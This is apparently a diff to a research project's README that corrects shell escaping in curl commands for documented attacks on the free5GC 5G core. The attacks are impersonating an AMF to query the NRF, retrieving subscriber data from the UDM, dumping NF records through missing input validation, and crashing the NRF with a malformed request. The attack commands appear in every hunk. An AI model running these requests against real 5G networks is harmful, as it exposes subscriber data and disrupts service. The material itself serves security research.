@@ -58,7 +58,7 @@ The *Attacks* directory contains each of the attacks, each divided into its own 
 ### AMFLookingForUDM
 This attack is performed by requesting information about the unified data management (UDM) network function while impersonating an access and mobility management function (AMF). Internally this attack appears to be a benign system request and exploits the fact that the network repository function (NRF) does not check if the source of the request is actually an AMF. This attack is performed with the following Linux command:
 ```
-curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF\&target-nf-type=UDM" 
+curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM" 
 ```
 where 127.0.0.10 is the IP address of the NRF. 
 
@@ -68,13 +68,13 @@ This attack is performed identically to *AMFLookingForUDM* except the `target-nf
 ### GetUserData
 This attack requests information from the UDM regarding a user with `subscriberID=0000000003`. This attack  was performed with:  
 ```
-curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893\$\{subscriberID\}/am-data?plmn-id=\%7B\%22mcc\%22\%3A\%22208\%22\%2C\%22mnc\%22\%3A\%2293\%22\%7D"
+curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B\%22mcc\%22\%3A\%22208\%22\%2C\%22mnc\%22\%3A\%2293\%22\%7D"
 ```
 
 ### randomDataDump    
 This attack exploits a lack of input validation in free5GC and sets the `requester-nf-type` to a random string when making an `nf-instances` request to the NRF. The NRF will still respond with all of the NFs. This attack is executed with the following Linux command: 
 ```
-curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=\$randomString\&target-nf-type="
+curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=$randomString&target-nf-type="
 ```
 
 ### automatedRedirectWithTimer
@@ -270,7 +270,7 @@ This attack is the same as "FakeAMFInsert" except the instance ID is a randomly 
 ### CrashNRF
 This attack relies on an exploit in free5GC wherein a malformed request to the network repository function (NRF) will cause it to crash. This attack is run using
 ```
-curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=\&target-nf-type="
+curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=&target-nf-type="
 ```
 where 127.0.0.10 is the IP address of the NRF. As of free5GC v3.1.1, this exploit appears to have been patched, as this HTTP `GET` request will no longer result in the failure of the core. 
    
